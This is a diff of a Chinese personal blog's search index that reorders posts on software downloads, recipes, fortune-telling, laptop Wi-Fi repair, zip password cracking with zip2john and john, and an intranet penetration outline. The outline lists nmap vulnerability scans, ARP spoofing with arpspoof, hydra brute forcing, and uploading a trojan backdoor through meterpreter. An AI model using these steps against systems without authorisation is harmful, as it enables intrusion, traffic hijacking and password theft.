-<p>地址：<br><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></p>
-</blockquote>
-<hr>
-<h2 id="视频文件"><a href="#视频文件" class="headerlink" title="视频文件"></a>视频文件</h2><h3 id="VLC"><a href="#VLC" class="headerlink" title="VLC"></a>VLC</h3><blockquote>
-<p>下载地址：（或者windows商店）<br><a href="https://www.videolan.org/vlc/index.zh_CN.html">https://www.videolan.org/vlc/index.zh_CN.html</a></p>
-</blockquote>
-<hr>
-<h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><h3 id="VM"><a href="#VM" class="headerlink" title="VM"></a>VM</h3><blockquote>
-<p>下载地址：<br><a href="https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion#product-overview">https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion#product-overview</a></p>
-</blockquote>
-<hr>
-]]></content>
-      <categories>
-        <category>好用软件</category>
-      </categories>
-      <tags>
-        <tag>工具</tag>
-        <tag>资源</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>windows域部署及管理</title>
     <url>/2025/04/26/windows%E5%9F%9F%E9%83%A8%E7%BD%B2%E5%8F%8A%E7%AE%A1%E7%90%86/</url>
     <content><![CDATA[<h2 id="windows域"><a href="#windows域" class="headerlink" title="windows域"></a>windows域</h2><ul>
@@ -3240,6 +3384,23 @@ run
       <tags>
         <tag>windows图形化</tag>
         <tag>cmd</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>压缩包密码爆破</title>
+    <url>/2024/08/10/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
+    <content><![CDATA[<h2 id="使用zip2john-hash值破解"><a href="#使用zip2john-hash值破解" class="headerlink" title="使用zip2john hash值破解"></a>使用zip2john hash值破解</h2><p>生成压缩包hash值</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john filename.zip &gt; hash.txt</span><br></pre></td></tr></table></figure>
+<p>开始破解</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash.txt</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>网络安全</category>
+        <category>kali</category>
+      </categories>
+      <tags>
+        <tag>网络安全</tag>
+        <tag>kali</tag>
+        <tag>hashcat</tag>
       </tags>
   </entry>
   <entry>
@@ -3363,23 +3524,6 @@ run
       </tags>
   </entry>
   <entry>
-    <title>压缩包密码爆破</title>
-    <url>/2024/08/10/%E5%8E%8B%E7%BC%A9%E5%8C%85%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</url>
-    <content><![CDATA[<h2 id="使用zip2john-hash值破解"><a href="#使用zip2john-hash值破解" class="headerlink" title="使用zip2john hash值破解"></a>使用zip2john hash值破解</h2><p>生成压缩包hash值</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john filename.zip &gt; hash.txt</span><br></pre></td></tr></table></figure>
-<p>开始破解</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">john hash.txt</span><br></pre></td></tr></table></figure>]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>kali</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-        <tag>kali</tag>
-        <tag>hashcat</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>奇异人生-【汉化包】</title>
     <url>/2025/06/22/%E5%A5%87%E5%BC%82%E4%BA%BA%E7%94%9F-%E3%80%90%E6%B1%89%E5%8C%96%E5%8C%85%E3%80%91/</url>
     <content><![CDATA[<h2 id="下载地址"><a href="#下载地址" class="headerlink" title="下载地址"></a>下载地址</h2><p>汉化组：</p>
@@ -3497,25 +3641,6 @@ run
       </tags>
   </entry>
   <entry>
-    <title>安全-内网渗透</title>
-    <url>/2024/08/01/%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
-    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活<br>    ettercap -G 蜘蛛<br>    nmap<br>    nmap -sS 网段</p>
-<p>漏洞搜集<br>    awvs			网站扫描<br>    gvm(openvas)	系统扫描<br>    nmap<br>    nmap –script&#x3D;vuln &#x2F;&#x2F;常见漏洞<br>    nmap –script-default &#x2F;&#x2F;默认收集信息脚本</p>
-<h2 id="进入目标后"><a href="#进入目标后" class="headerlink" title="进入目标后"></a>进入目标后</h2><p>提权<br>    创建高权限用户<br>        windows<br>            net use<br>        linux<br>            user add</p>
-<p>留后门<br>    创建木马<br>        木马(msfconsole)<br>    上传木马<br>        meterpreter<br>            upload</p>
-<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改变流量走向<br>    ettercap(arp欺骗、dns劫持等)<br>    arpspoof<br>    arpspoof -i 网卡名称 -t 目标IP 网关</p>
-<p>爆破密码<br>    hydra（九头蛇）<br>    msfconsole（爆破密码模块）</p>
-<p>漏洞攻击<br>    msfconsole（漏洞攻击目录）</p>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-        <category>kali</category>
-      </categories>
-      <tags>
-        <tag>网络安全</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>滑蛋饭</title>
     <url>/2025/05/15/%E6%BB%91%E8%9B%8B%E9%A5%AD/</url>
     <content><![CDATA[<h2 id="调料"><a href="#调料" class="headerlink" title="调料"></a>调料</h2><table>
@@ -3570,33 +3695,22 @@ run
       </tags>
   </entry>
   <entry>
-    <title>笔记本无线网卡异常</title>
-    <url>/2025/03/22/%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%BC%82%E5%B8%B8/</url>
-    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>这次遇到的问题现象是一开始网卡会时不时异常，通过重启和去除静电的方法会恢复正常，但是突然有一天就开始无法恢复了，始终保持异常的状态，怎么重新安装驱动都没用。</p>
-<p>但是主机是一直有识别到网卡的，设备管理显示黄色告警。</p>
-<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><h3 id="拆机拔插网卡"><a href="#拆机拔插网卡" class="headerlink" title="拆机拔插网卡"></a>拆机拔插网卡</h3><p>网卡拆下来用纸巾擦干净，或者酒精，重新安装即恢复</p>
-<p><del>原本是一直用手机usb共享网络使用网络了，但是有一天突然想到小时候的小霸王游戏卡都是擦擦金手指解决的， 尝试后没想到真有用</del></p>
-<blockquote>
-<p>这个是我这次的问题解决办法，正常解决途径有以下方法</p>
-</blockquote>
-<h3 id="去除静电"><a href="#去除静电" class="headerlink" title="去除静电"></a>去除静电</h3><ol>
-<li>拔掉电脑上所有的线</li>
-<li>启动键一直按，按到关机后再按20秒</li>
-</ol>
-<p>操作成功后启动我的联想y7000键盘灯会是熄灭的</p>
-<h3 id="更新-重新下载网卡驱动"><a href="#更新-重新下载网卡驱动" class="headerlink" title="更新&#x2F;重新下载网卡驱动"></a>更新&#x2F;重新下载网卡驱动</h3><ul>
-<li>使用intel网卡驱动自动检测下载工具<blockquote>
-<p>下载地址：<br><a href="https://www.intel.cn/content/www/cn/zh/download/19351/intel-wireless-wi-fi-drivers-for-windows-10-and-windows-11.html">https://www.intel.cn/content/www/cn/zh/download/19351/intel-wireless-wi-fi-drivers-for-windows-10-and-windows-11.html</a><br>其他驱动：<br><a href="https://www.intel.cn/content/www/cn/zh/download-center/home.html">https://www.intel.cn/content/www/cn/zh/download-center/home.html</a></p>
-</blockquote>
-</li>
-</ul>
+    <title>安全-内网渗透</title>
+    <url>/2024/08/01/%E5%AE%89%E5%85%A8-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
+    <content><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主机存活<br>    ettercap -G 蜘蛛<br>    nmap<br>    nmap -sS 网段</p>
+<p>漏洞搜集<br>    awvs			网站扫描<br>    gvm(openvas)	系统扫描<br>    nmap<br>    nmap –script&#x3D;vuln &#x2F;&#x2F;常见漏洞<br>    nmap –script-default &#x2F;&#x2F;默认收集信息脚本</p>
+<h2 id="进入目标后"><a href="#进入目标后" class="headerlink" title="进入目标后"></a>进入目标后</h2><p>提权<br>    创建高权限用户<br>        windows<br>            net use<br>        linux<br>            user add</p>
+<p>留后门<br>    创建木马<br>        木马(msfconsole)<br>    上传木马<br>        meterpreter<br>            upload</p>
+<h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><p>改变流量走向<br>    ettercap(arp欺骗、dns劫持等)<br>    arpspoof<br>    arpspoof -i 网卡名称 -t 目标IP 网关</p>
+<p>爆破密码<br>    hydra（九头蛇）<br>    msfconsole（爆破密码模块）</p>
+<p>漏洞攻击<br>    msfconsole（漏洞攻击目录）</p>
 ]]></content>
       <categories>
-        <category>笔记本维修</category>
+        <category>网络安全</category>
+        <category>kali</category>
       </categories>
       <tags>
-        <tag>笔记本无线网卡</tag>
-        <tag>维修</tag>
+        <tag>网络安全</tag>
       </tags>
   </entry>
   <entry>
@@ -3693,46 +3807,33 @@ run
       </tags>
   </entry>
   <entry>
-    <title>算命</title>
-    <url>/2025/02/05/%E7%AE%97%E5%91%BD/</url>
-    <content><![CDATA[<h2 id="六神"><a href="#六神" class="headerlink" title="六神"></a>六神</h2><h3 id="手势位置"><a href="#手势位置" class="headerlink" title="手势位置"></a>手势位置</h3><p>左手三指，分别是大安、流连、速喜、赤口、小吉、空亡<br><img src="/images/pasted-71.png" alt="upload successful"></p>
-<p>速记：大、流、速、赤、小、空。</p>
-<h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><h4 id="大安"><a href="#大安" class="headerlink" title="大安"></a>大安</h4><p>1、身不动时（如果算一个人在干什么）<br>2、五行：属木<br>3、方位：东<br>4、神煞：青龙<br>5、数字：1、5、7<br>6、安心吉祥的意思</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大安事事昌</span><br><span class="line">求谋在东方</span><br><span class="line">失物去不远</span><br><span class="line">宅家保平安</span><br><span class="line">行人身未动</span><br><span class="line">病者主无妨</span><br><span class="line">将军回田野</span><br><span class="line">仔细更推详</span><br></pre></td></tr></table></figure>
-
-<h4 id="留连"><a href="#留连" class="headerlink" title="留连"></a>留连</h4><p>1、人未归时<br>2、五行属水<br>3、黑色<br>4、方位北<br>5、玄武<br>6、数字：2、8、10<br>7、有暗昧不明、延迟、纠缠、拖延、漫长之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留连事难成</span><br><span class="line">求谋日未明</span><br><span class="line">官事凡宜缓</span><br><span class="line">去者未回程</span><br><span class="line">失物南方见</span><br><span class="line">急讨方心称</span><br><span class="line">更须防口舌</span><br><span class="line">人口且平平</span><br></pre></td></tr></table></figure>
-
-<h4 id="速喜"><a href="#速喜" class="headerlink" title="速喜"></a>速喜</h4><p>1、人即至时<br>2、五行属火<br>3、红色<br>4、方位为南方<br>5、数字：3,6,9<br>6、有快速、吉利、时机已到之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">速喜喜来临</span><br><span class="line">求财向南行</span><br><span class="line">失物申未午（南、西南）</span><br><span class="line">逢人路上寻</span><br><span class="line">官事有福德</span><br><span class="line">病者无祸侵</span><br><span class="line">田宅六畜吉</span><br><span class="line">行人有信音</span><br></pre></td></tr></table></figure>
-
-<h4 id="赤口"><a href="#赤口" class="headerlink" title="赤口"></a>赤口</h4><p>1、官事凶时<br>2、五行属金<br>3、白色<br>4、西方<br>5、白虎<br>6、数字：4，7，10<br>7、有不吉、惊恐、凶险、口舌是非之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">赤口主口舌</span><br><span class="line">官非切宜防</span><br><span class="line">失物急去寻</span><br><span class="line">行人有惊慌</span><br><span class="line">鸡犬（六畜）多作怪</span><br><span class="line">病者出西方</span><br><span class="line">更须防咀咒</span><br><span class="line">诚恐染瘟皇</span><br></pre></td></tr></table></figure>
-
-<h4 id="小吉"><a href="#小吉" class="headerlink" title="小吉"></a>小吉</h4><p>1、人来喜时<br>2、五行属木<br>3、六合<br>4、数字：1,5,7<br>5、有和合、吉利之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小吉最吉昌</span><br><span class="line">路上好商量</span><br><span class="line">阴人来报喜</span><br><span class="line">失物在坤方（西南）</span><br><span class="line">行人即便至</span><br><span class="line">交易甚是强</span><br><span class="line">凡事皆和合</span><br><span class="line">病者祈上苍</span><br></pre></td></tr></table></figure>
-
-<h4 id="空亡"><a href="#空亡" class="headerlink" title="空亡"></a>空亡</h4><p>1、音信稀时<br>2、五行属土<br>3、黄色<br>4、中央<br>5、勾陈<br>6、数字：3,6,9<br>7、有不吉、无果之意</p>
-<p>口诀：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空亡事不祥</span><br><span class="line">阴人多乖张</span><br><span class="line">求财无利益</span><br><span class="line">行人有灾殃</span><br><span class="line">失物寻一见</span><br><span class="line">官事有刑伤</span><br><span class="line">病人逢暗鬼</span><br><span class="line">祈解保安康</span><br></pre></td></tr></table></figure>
-
-<h2 id="奇门"><a href="#奇门" class="headerlink" title="奇门"></a>奇门</h2><h3 id="九宫五行"><a href="#九宫五行" class="headerlink" title="九宫五行"></a>九宫五行</h3><p>五行生克关系<br><img src="/images/pasted-74.png" alt="upload successful"><br>九宫位置<br><img src="/images/pasted-73.png" alt="upload successful"><br>东南西北位置<br><img src="/images/pasted-75.png" alt="upload successful"></p>
-<h2 id="干支"><a href="#干支" class="headerlink" title="干支"></a>干支</h2><p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水</p>
-<p>寅卯为木居东方，巳午为火居正南，<br>申酉属金位在西，子亥属水在北边，<br>辰戌丑未皆属土，分别居于四维偏，<br>辰在东南戌西北，丑在东北未西南。</p>
-<h2 id="时辰"><a href="#时辰" class="headerlink" title="时辰"></a>时辰</h2><p>子丑寅卯辰巳午未申酉戌亥</p>
+    <title>笔记本无线网卡异常</title>
+    <url>/2025/03/22/%E7%AC%94%E8%AE%B0%E6%9C%AC%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%BC%82%E5%B8%B8/</url>
+    <content><![CDATA[<h2 id="问题现象"><a href="#问题现象" class="headerlink" title="问题现象"></a>问题现象</h2><p>这次遇到的问题现象是一开始网卡会时不时异常，通过重启和去除静电的方法会恢复正常，但是突然有一天就开始无法恢复了，始终保持异常的状态，怎么重新安装驱动都没用。</p>
+<p>但是主机是一直有识别到网卡的，设备管理显示黄色告警。</p>
+<h2 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h2><h3 id="拆机拔插网卡"><a href="#拆机拔插网卡" class="headerlink" title="拆机拔插网卡"></a>拆机拔插网卡</h3><p>网卡拆下来用纸巾擦干净，或者酒精，重新安装即恢复</p>
+<p><del>原本是一直用手机usb共享网络使用网络了，但是有一天突然想到小时候的小霸王游戏卡都是擦擦金手指解决的， 尝试后没想到真有用</del></p>
+<blockquote>
+<p>这个是我这次的问题解决办法，正常解决途径有以下方法</p>
+</blockquote>
+<h3 id="去除静电"><a href="#去除静电" class="headerlink" title="去除静电"></a>去除静电</h3><ol>
+<li>拔掉电脑上所有的线</li>
+<li>启动键一直按，按到关机后再按20秒</li>
+</ol>
+<p>操作成功后启动我的联想y7000键盘灯会是熄灭的</p>
+<h3 id="更新-重新下载网卡驱动"><a href="#更新-重新下载网卡驱动" class="headerlink" title="更新&#x2F;重新下载网卡驱动"></a>更新&#x2F;重新下载网卡驱动</h3><ul>
+<li>使用intel网卡驱动自动检测下载工具<blockquote>
+<p>下载地址：<br><a href="https://www.intel.cn/content/www/cn/zh/download/19351/intel-wireless-wi-fi-drivers-for-windows-10-and-windows-11.html">https://www.intel.cn/content/www/cn/zh/download/19351/intel-wireless-wi-fi-drivers-for-windows-10-and-windows-11.html</a><br>其他驱动：<br><a href="https://www.intel.cn/content/www/cn/zh/download-center/home.html">https://www.intel.cn/content/www/cn/zh/download-center/home.html</a></p>
+</blockquote>
+</li>
+</ul>
 ]]></content>
       <categories>
-        <category>生活</category>
-        <category>玄学</category>
+        <category>笔记本维修</category>
       </categories>
       <tags>
-        <tag>算命知识</tag>
-        <tag>小六壬</tag>
+        <tag>笔记本无线网卡</tag>
+        <tag>维修</tag>
       </tags>
   </entry>
   <entry>
@@ -3810,78 +3911,46 @@ width: 20%;
       </tags>
   </entry>
   <entry>
-    <title>莴笋炒腊肠</title>
-    <url>/2025/02/10/%E8%8E%B4%E7%AC%8B%E7%82%92%E8%85%8A%E8%82%A0/</url>
-    <content><![CDATA[<h2 id="配料"><a href="#配料" class="headerlink" title="配料"></a>配料</h2><style>
-table th:nth-of-type(1) {
-width: 20%;
-}
-</style>
-<table>
-<thead>
-<tr>
-<th align="center">名称</th>
-<th align="left">量</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="center">莴笋</td>
-<td align="left">一根</td>
-</tr>
-<tr>
-<td align="center">腊肠</td>
-<td align="left">两根</td>
-</tr>
-<tr>
-<td align="center">大蒜</td>
-<td align="left">4-5瓣</td>
-</tr>
-<tr>
-<td align="center">姜</td>
-<td align="left">适量</td>
-</tr>
-<tr>
-<td align="center">干辣椒</td>
-<td align="left">三个</td>
-</tr>
-<tr>
-<td align="center">鸡精</td>
-<td align="left">适量</td>
-</tr>
-<tr>
-<td align="center">盐</td>
-<td align="left">少</td>
-</tr>
-<tr>
-<td align="center">糖</td>
-<td align="left">少</td>
-</tr>
-<tr>
-<td align="center">酱油</td>
-<td align="left">适量</td>
-</tr>
-<tr>
-<td align="center">耗油</td>
-<td align="left">适量</td>
-</tr>
-<tr>
-<td align="center">香油</td>
-<td align="left">适量</td>
-</tr>
-</tbody></table>
-<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
-<li>腊肠如果太硬焯水，或者泡水，切片；莴笋切片；姜切丝；干辣椒切段；蒜剥皮随便剁两下；</li>
-<li>油烧热炒腊肠微微黄即可；</li>
-<li>加姜丝、蒜、干辣椒，炒香后倒入莴笋；</li>
-<li>翻炒几下加少量水；加入所有调味料，香油出锅前加入翻炒几下即可。</li>
-</ol>
+    <title>算命</title>
+    <url>/2025/02/05/%E7%AE%97%E5%91%BD/</url>
+    <content><![CDATA[<h2 id="六神"><a href="#六神" class="headerlink" title="六神"></a>六神</h2><h3 id="手势位置"><a href="#手势位置" class="headerlink" title="手势位置"></a>手势位置</h3><p>左手三指，分别是大安、流连、速喜、赤口、小吉、空亡<br><img src="/images/pasted-71.png" alt="upload successful"></p>
+<p>速记：大、流、速、赤、小、空。</p>
+<h3 id="详解"><a href="#详解" class="headerlink" title="详解"></a>详解</h3><h4 id="大安"><a href="#大安" class="headerlink" title="大安"></a>大安</h4><p>1、身不动时（如果算一个人在干什么）<br>2、五行：属木<br>3、方位：东<br>4、神煞：青龙<br>5、数字：1、5、7<br>6、安心吉祥的意思</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">大安事事昌</span><br><span class="line">求谋在东方</span><br><span class="line">失物去不远</span><br><span class="line">宅家保平安</span><br><span class="line">行人身未动</span><br><span class="line">病者主无妨</span><br><span class="line">将军回田野</span><br><span class="line">仔细更推详</span><br></pre></td></tr></table></figure>
+
+<h4 id="留连"><a href="#留连" class="headerlink" title="留连"></a>留连</h4><p>1、人未归时<br>2、五行属水<br>3、黑色<br>4、方位北<br>5、玄武<br>6、数字：2、8、10<br>7、有暗昧不明、延迟、纠缠、拖延、漫长之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">留连事难成</span><br><span class="line">求谋日未明</span><br><span class="line">官事凡宜缓</span><br><span class="line">去者未回程</span><br><span class="line">失物南方见</span><br><span class="line">急讨方心称</span><br><span class="line">更须防口舌</span><br><span class="line">人口且平平</span><br></pre></td></tr></table></figure>
+
+<h4 id="速喜"><a href="#速喜" class="headerlink" title="速喜"></a>速喜</h4><p>1、人即至时<br>2、五行属火<br>3、红色<br>4、方位为南方<br>5、数字：3,6,9<br>6、有快速、吉利、时机已到之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">速喜喜来临</span><br><span class="line">求财向南行</span><br><span class="line">失物申未午（南、西南）</span><br><span class="line">逢人路上寻</span><br><span class="line">官事有福德</span><br><span class="line">病者无祸侵</span><br><span class="line">田宅六畜吉</span><br><span class="line">行人有信音</span><br></pre></td></tr></table></figure>
+
+<h4 id="赤口"><a href="#赤口" class="headerlink" title="赤口"></a>赤口</h4><p>1、官事凶时<br>2、五行属金<br>3、白色<br>4、西方<br>5、白虎<br>6、数字：4，7，10<br>7、有不吉、惊恐、凶险、口舌是非之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">赤口主口舌</span><br><span class="line">官非切宜防</span><br><span class="line">失物急去寻</span><br><span class="line">行人有惊慌</span><br><span class="line">鸡犬（六畜）多作怪</span><br><span class="line">病者出西方</span><br><span class="line">更须防咀咒</span><br><span class="line">诚恐染瘟皇</span><br></pre></td></tr></table></figure>
+
+<h4 id="小吉"><a href="#小吉" class="headerlink" title="小吉"></a>小吉</h4><p>1、人来喜时<br>2、五行属木<br>3、六合<br>4、数字：1,5,7<br>5、有和合、吉利之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">小吉最吉昌</span><br><span class="line">路上好商量</span><br><span class="line">阴人来报喜</span><br><span class="line">失物在坤方（西南）</span><br><span class="line">行人即便至</span><br><span class="line">交易甚是强</span><br><span class="line">凡事皆和合</span><br><span class="line">病者祈上苍</span><br></pre></td></tr></table></figure>
+
+<h4 id="空亡"><a href="#空亡" class="headerlink" title="空亡"></a>空亡</h4><p>1、音信稀时<br>2、五行属土<br>3、黄色<br>4、中央<br>5、勾陈<br>6、数字：3,6,9<br>7、有不吉、无果之意</p>
+<p>口诀：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">空亡事不祥</span><br><span class="line">阴人多乖张</span><br><span class="line">求财无利益</span><br><span class="line">行人有灾殃</span><br><span class="line">失物寻一见</span><br><span class="line">官事有刑伤</span><br><span class="line">病人逢暗鬼</span><br><span class="line">祈解保安康</span><br></pre></td></tr></table></figure>
+
+<h2 id="奇门"><a href="#奇门" class="headerlink" title="奇门"></a>奇门</h2><h3 id="九宫五行"><a href="#九宫五行" class="headerlink" title="九宫五行"></a>九宫五行</h3><p>五行生克关系<br><img src="/images/pasted-74.png" alt="upload successful"><br>九宫位置<br><img src="/images/pasted-73.png" alt="upload successful"><br>东南西北位置<br><img src="/images/pasted-75.png" alt="upload successful"></p>
+<h2 id="干支"><a href="#干支" class="headerlink" title="干支"></a>干支</h2><p>甲乙东方木，丙丁南方火，戊己中央土，庚辛西方金，壬癸北方水</p>
+<p>寅卯为木居东方，巳午为火居正南，<br>申酉属金位在西，子亥属水在北边，<br>辰戌丑未皆属土，分别居于四维偏，<br>辰在东南戌西北，丑在东北未西南。</p>
+<h2 id="时辰"><a href="#时辰" class="headerlink" title="时辰"></a>时辰</h2><p>子丑寅卯辰巳午未申酉戌亥</p>
 ]]></content>
       <categories>
         <category>生活</category>
-        <category>菜谱</category>
+        <category>玄学</category>
       </categories>
       <tags>
-        <tag>菜谱</tag>
+        <tag>算命知识</tag>
+        <tag>小六壬</tag>
       </tags>
   </entry>
   <entry>
@@ -4135,6 +4204,81 @@ width: 20%;
       </categories>
       <tags>
         <tag>linux命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>莴笋炒腊肠</title>
+    <url>/2025/02/10/%E8%8E%B4%E7%AC%8B%E7%82%92%E8%85%8A%E8%82%A0/</url>
+    <content><![CDATA[<h2 id="配料"><a href="#配料" class="headerlink" title="配料"></a>配料</h2><style>
+table th:nth-of-type(1) {
+width: 20%;
+}
+</style>
+<table>
+<thead>
+<tr>
+<th align="center">名称</th>
+<th align="left">量</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">莴笋</td>
+<td align="left">一根</td>
+</tr>
+<tr>
+<td align="center">腊肠</td>
+<td align="left">两根</td>
+</tr>
+<tr>
+<td align="center">大蒜</td>
+<td align="left">4-5瓣</td>
+</tr>
+<tr>
+<td align="center">姜</td>
+<td align="left">适量</td>
+</tr>
+<tr>
+<td align="center">干辣椒</td>
+<td align="left">三个</td>
+</tr>
+<tr>
+<td align="center">鸡精</td>
+<td align="left">适量</td>
+</tr>
+<tr>
+<td align="center">盐</td>
+<td align="left">少</td>
+</tr>
+<tr>
+<td align="center">糖</td>
+<td align="left">少</td>
+</tr>
+<tr>
+<td align="center">酱油</td>
+<td align="left">适量</td>
+</tr>
+<tr>
+<td align="center">耗油</td>
+<td align="left">适量</td>
+</tr>
+<tr>
+<td align="center">香油</td>
+<td align="left">适量</td>
+</tr>
+</tbody></table>
+<h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><ol>
+<li>腊肠如果太硬焯水，或者泡水，切片；莴笋切片；姜切丝；干辣椒切段；蒜剥皮随便剁两下；</li>
+<li>油烧热炒腊肠微微黄即可；</li>
+<li>加姜丝、蒜、干辣椒，炒香后倒入莴笋；</li>
+<li>翻炒几下加少量水；加入所有调味料，香油出锅前加入翻炒几下即可。</li>
+</ol>
+]]></content>
+      <categories>
+        <category>生活</category>
+        <category>菜谱</category>
+      </categories>
+      <tags>
+        <tag>菜谱</tag>
       </tags>
   </entry>
   <entry>
